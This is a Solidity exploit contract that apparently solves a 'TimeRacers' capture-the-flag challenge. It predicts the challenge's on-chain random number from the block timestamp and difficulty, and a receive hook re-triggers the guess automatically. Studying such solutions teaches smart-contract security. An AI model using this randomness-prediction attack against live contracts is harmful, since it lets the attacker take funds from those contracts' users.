// SPDX-License-Identifier: MIT;
pragma solidity ^0.6.10;

interface ITimeRacers {
    function startGame() external payable;
    function reset() external;
    function submitGuess(uint256 guess) external returns (bool);
    function hasGameInProgress() external view returns (bool);
    function isSolved() external view returns (bool);
}

contract TimeRacersAttacker {
    ITimeRacers challenge;

    constructor(address _challenge) public payable {
        challenge = ITimeRacers(_challenge);
    }

    function startGame() public payable {
        challenge.startGame{value: msg.value}();
    }

    function attack() public payable returns (bool) {
        uint256 guess = uint256(keccak256(abi.encodePacked(bytes32(uint256(block.timestamp + block.difficulty + uint256(keccak256(abi.encodePacked(block.timestamp))))))));
        bool validity = challenge.submitGuess(guess);
        return validity;
    }

    receive() external payable {
        if (address(msg.sender).balance >= 0.002 ether) {
            attack();
        }
    }
}